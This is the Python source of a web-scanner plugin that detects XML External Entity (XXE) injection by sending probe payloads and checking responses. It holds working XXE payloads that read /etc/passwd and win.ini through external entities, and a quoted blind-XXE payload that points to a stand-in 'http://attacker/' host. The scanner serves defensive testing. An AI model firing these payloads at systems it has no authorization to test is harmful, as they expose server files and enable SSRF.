"""Plugin: detect XML External Entity (XXE) injection.

XXE attacks abuse XML parsers that resolve external entity references. A
vulnerable parser will fetch the referenced resource (file, URL, …) and
inline its content into the response — letting an attacker read arbitrary
files, perform SSRF, or exhaust memory via the "billion laughs" attack.

The plugin is **active**: it sends probe payloads. To minimise risk it only
ever references *local* resources (``file:///etc/passwd``, ``file:///win.ini``)
or self-referencing entities — never an external attacker-controlled URL.

Detection is **content-verified** to cut false positives:

1. **Internal-entity probe (HIGH, FIRM):** send a payload that defines an
   internal entity ``&xxe;`` and reference it. If the response contains the
   marker value, the parser resolves general entities — a prerequisite for
   XXE. We don't yet know if *external* entities are processed.
2. **External-entity probe (CRITICAL, FIRM):** send a payload that defines
   an external entity referencing ``file:///etc/passwd``. If the response
   contains ``root:x:0:0:`` (Linux) or ``[fonts]`` (Windows), XXE is
   confirmed and exploitable.
3. **No resolution, but XML accepted (INFO, INFORMATIONAL):** the server
   returns 200 to an XML request without echoing the entity — could be
   blind XXE (out-of-band), could be safe parser. Manual review needed.

The plugin probes endpoints that:

* Already accept XML (``Content-Type: application/xml`` in the baseline response)
* Are reached via a parameter named ``xml``, ``data``, ``payload``, ``body``
  or similar — these often feed straight into an XML parser.

To keep the false-positive rate low:

* The marker string used in the internal-entity probe is a long random-
  looking token — never matches any real content by accident.
* The external-entity check requires actual file content markers (not just
  status 200).
* The "XML accepted" INFO finding is only emitted when the server returns
  a 2xx for an XML body but does NOT echo our marker — silently ignoring
  user XML is itself suspicious but not exploitable, hence INFORMATIONAL.
"""
from __future__ import annotations

import asyncio
import secrets
from urllib.parse import urlparse

import aiohttp

from webscan.models import Confidence, Finding, Severity
from webscan.plugins.base import BasePlugin

# ─── Probe templates ──────────────────────────────────────────────────────────

# A unique marker the parser will inline if it resolves internal entities.
# Generated fresh per scan so a fixed string in the response can't be a
# false positive from another source.
_MARKER_PREFIX = "XXE_TEST_MARKER"
_MARKER_SUFFIX = "_END"

# Internal-entity probe: defines an entity and references it. If the parser
# is entity-aware, the response will contain the marker.
_INTERNAL_ENTITY_TEMPLATE = (
    '<?xml version="1.0" encoding="UTF-8"?>'
    '<!DOCTYPE foo ['
    f'  <!ENTITY xxe "{_MARKER_PREFIX}{{token}}{_MARKER_SUFFIX}">'
    ']>'
    "<foo>&xxe;</foo>"
)

# External-entity probe (Linux): references /etc/passwd.
_EXTERNAL_ENTITY_LINUX_TEMPLATE = (
    '<?xml version="1.0" encoding="UTF-8"?>'
    '<!DOCTYPE foo ['
    '  <!ENTITY xxe SYSTEM "file:///etc/passwd">'
    ']>'
    "<foo>&xxe;</foo>"
)

# External-entity probe (Windows): references win.ini.
_EXTERNAL_ENTITY_WINDOWS_TEMPLATE = (
    '<?xml version="1.0" encoding="UTF-8"?>'
    '<!DOCTYPE foo ['
    '  <!ENTITY xxe SYSTEM "file:///c:/windows/win.ini">'
    ']>'
    "<foo>&xxe;</foo>"
)

# File-content markers (same as LFI plugin — reuse knowledge).
_LINUX_PASSWD_MARKERS: tuple[str, ...] = ("root:x:0:0:", "daemon:x:1:1:")
_WINDOWS_WININI_MARKERS: tuple[str, ...] = ("[fonts]", "[extensions]")

# Parameter names likely to feed an XML parser.
_XML_PARAM_NAMES: frozenset[str] = frozenset({
    "xml", "data", "payload", "body", "content", "msg", "message",
    "request", "soap", "envelope",
})

# Body-size threshold below which we won't bother parsing the response for
# markers — empty/short responses can't contain them anyway.
_MIN_RESPONSE_LENGTH = 16

# Cap probes per parameter.
_MAX_PROBES_PER_TARGET = 3


# ─── Helpers ──────────────────────────────────────────────────────────────────


def _looks_like_xml_endpoint(content_type: str, body: str) -> bool:
    """Heuristic: is this endpoint likely to accept XML input?

    True if the response advertises XML, or the body starts with ``<?xml``.
    """
    ct = (content_type or "").lower()
    if "xml" in ct:
        return True
    stripped = body.lstrip()[:200].lower()
    return stripped.startswith("<?xml") or "<soap:envelope" in stripped


def _find_xml_params(target: str) -> list[str]:
    """Return parameter names in *target*'s query string that look XML-related."""
    parsed = urlparse(target)
    if not parsed.query:
        return []
    out: list[str] = []
    seen: set[str] = set()
    # Parse manually to preserve order and avoid dict weirdness.
    for pair in parsed.query.split("&"):
        if "=" not in pair:
            continue
        name, _ = pair.split("=", 1)
        if name.lower() in _XML_PARAM_NAMES and name not in seen:
            out.append(name)
            seen.add(name)
    return out


def _has_marker(body: str, markers: tuple[str, ...]) -> bool:
    return any(m in body for m in markers)


# ─── Plugin ───────────────────────────────────────────────────────────────────


class XxePlugin(BasePlugin):
    """Probe XML-accepting endpoints for internal/external entity resolution."""

    name = "xxe"
    description = "Detect XML External Entity (XXE) via internal + external entity probes"

    async def run(
        self,
        target: str,
        session: aiohttp.ClientSession,
    ) -> list[Finding]:
        findings: list[Finding] = []

        # Step 1: GET the target to learn whether it accepts XML.
        try:
            async with session.get(target, allow_redirects=True, ssl=False) as resp:
                content_type = resp.headers.get("Content-Type", "")
                baseline_body = await resp.text(errors="ignore")
                baseline_status = resp.status
        except (aiohttp.ClientError, asyncio.TimeoutError, UnicodeError):
            return findings

        is_xml_endpoint = _looks_like_xml_endpoint(content_type, baseline_body)
        xml_params = _find_xml_params(target)

        # If this isn't an XML endpoint and has no XML-related params, skip.
        if not is_xml_endpoint and not xml_params:
            return findings

        # Step 2: send the internal-entity probe as POST body.
        # Generate a per-scan marker so we don't false-positive on a string
        # that happens to be in the response already.
        token = secrets.token_hex(8)
        marker = f"{_MARKER_PREFIX}{token}{_MARKER_SUFFIX}"
        probe_body = _INTERNAL_ENTITY_TEMPLATE.format(token=token)

        probe_response_body, probe_status = await self._post_xml(session, target, probe_body)
        if probe_response_body is None:
            return findings

        # Step 3: check if the marker was inlined (entity resolution works).
        if marker in probe_response_body:
            # Internal entities resolve. Now try external entities.
            ext_response_body, ext_status = await self._post_xml(
                session, target, _EXTERNAL_ENTITY_LINUX_TEMPLATE
            )
            if (
                ext_response_body is not None
                and _has_marker(ext_response_body, _LINUX_PASSWD_MARKERS)
            ):
                # CRITICAL — external entity resolution confirmed, /etc/passwd leaked.
                findings.append(self._make_finding(
                    target=target,
                    severity=Severity.CRITICAL,
                    confidence=Confidence.FIRM,
                    title="XXE confirmed: /etc/passwd leaked via external entity",
                    description=(
                        "The endpoint accepts XML input and the parser resolves "
                        "external entities. A payload declaring "
                        "`<!ENTITY xxe SYSTEM \"file:///etc/passwd\">` caused the "
                        "server to inline the contents of `/etc/passwd` into the "
                        "response. An attacker can read arbitrary files, perform "
                        "SSRF via `http://`, or crash the server via the billion-"
                        "laughs attack."
                    ),
                    evidence={
                        "probe_method": "POST",
                        "probe_content_type": "application/xml",
                        "internal_entity_resolved": True,
                        "external_entity_resolved": True,
                        "matched_markers": list(_LINUX_PASSWD_MARKERS[:1]),
                        "http_status": ext_status,
                        "baseline_status": baseline_status,
                    },
                    remediation=(
                        "Disable external entity resolution in your XML parser. "
                        "In Python's `xml.etree.ElementTree`, use "
                        "`defusedxml.ElementTree` (which disables XXE by default). "
                        "In lxml, use `etree.XMLParser(resolve_entities=False, "
                        "no_network=True)`. In Java, set "
                        "`FEATURE_SECURE_PROCESSING` and disable DOCTYPE declarations."
                    ),
                ))
                return findings

            # Internal entities resolve but external didn't leak content.
            # Still dangerous — could be blind XXE (out-of-band exfiltration).
            findings.append(self._make_finding(
                target=target,
                severity=Severity.HIGH,
                confidence=Confidence.FIRM,
                title="XXE: parser resolves internal entities",
                description=(
                    "The endpoint accepts XML input and the parser resolves "
                    "general entities. A payload declaring "
                    "`<!ENTITY xxe \"MARKER\">` caused the server to inline the "
                    "marker value into the response. While the external-entity "
                    "probe did not leak file contents in-band, the parser is "
                    "entity-aware — blind (out-of-band) XXE may still be "
                    "possible via `<!ENTITY xxe SYSTEM \"http://attacker/\">`. "
                    "Manual verification recommended."
                ),
                evidence={
                    "probe_method": "POST",
                    "probe_content_type": "application/xml",
                    "internal_entity_resolved": True,
                    "external_entity_resolved": False,
                    "http_status": probe_status,
                    "baseline_status": baseline_status,
                    "marker_redacted": marker[:20] + "…",
                },
                remediation=(
                    "Disable DOCTYPE declarations and external entity resolution "
                    "in your XML parser. Use `defusedxml` (Python), "
                    "`XMLParser(resolve_entities=False, no_network=True)` (lxml), "
                    "or `FEATURE_SECURE_PROCESSING` (Java)."
                ),
            ))
            return findings

        # Step 4: marker NOT in response. Could be:
        # (a) Parser is safe (good)
        # (b) Parser is entity-unaware but accepts XML (unusual, suspicious)
        # (c) Blind XXE — entities resolve but content isn't echoed
        # If the server returned 2xx to a POST with an XML body, that's worth
        # an INFO finding — manual review needed.
        if 200 <= probe_status < 300 and len(probe_response_body) >= _MIN_RESPONSE_LENGTH:
            # Don't fire if the response is identical to the GET baseline —
            # that means the POST body was ignored entirely (not an XML parser).
            if probe_response_body != baseline_body:
                findings.append(self._make_finding(
                    target=target,
                    severity=Severity.INFO,
                    confidence=Confidence.INFORMATIONAL,
                    title="XML endpoint accepts POST XML without echoing entities",
                    description=(
                        "The endpoint accepted a POST request with "
                        "`Content-Type: application/xml` and an XML body "
                        "containing entity declarations, but did not echo the "
                        "entity value in the response. This could mean the "
                        "parser is safely configured, OR that blind (out-of-band) "
                        "XXE is possible. Manual verification recommended: send "
                        "a payload with an external entity pointing to your "
                        "Collaborator and watch for the callback."
                    ),
                    evidence={
                        "probe_method": "POST",
                        "probe_content_type": "application/xml",
                        "internal_entity_resolved": False,
                        "http_status": probe_status,
                        "baseline_status": baseline_status,
                        "response_length": len(probe_response_body),
                        "baseline_length": len(baseline_body),
                    },
                    remediation=(
                        "If the parser doesn't need to process external entities, "
                        "disable them explicitly. Test with an out-of-band "
                        "callback (Burp Collaborator) to confirm the parser is "
                        "truly safe."
                    ),
                ))

        return findings

    # ------------------------------------------------------------------
    # Internals
    # ------------------------------------------------------------------

    async def _post_xml(
        self,
        session: aiohttp.ClientSession,
        url: str,
        body: str,
    ) -> tuple[str | None, int]:
        """POST *body* as ``application/xml``. Returns ``(response_body, status)``."""
        try:
            async with session.post(
                url,
                data=body.encode("utf-8"),
                headers={"Content-Type": "application/xml"},
                allow_redirects=True,
                ssl=False,
            ) as resp:
                text = await resp.text(errors="ignore")
                return text, resp.status
        except (aiohttp.ClientError, asyncio.TimeoutError, UnicodeError):
            return None, 0

    def _make_finding(
        self,
        *,
        target: str,
        severity: Severity,
        confidence: Confidence,
        title: str,
        description: str,
        evidence: dict[str, object],
        remediation: str,
    ) -> Finding:
        return Finding(
            plugin=self.name,
            title=title,
            severity=severity,
            confidence=confidence,
            description=description,
            url=target,
            evidence=evidence,
            remediation=remediation,
        )
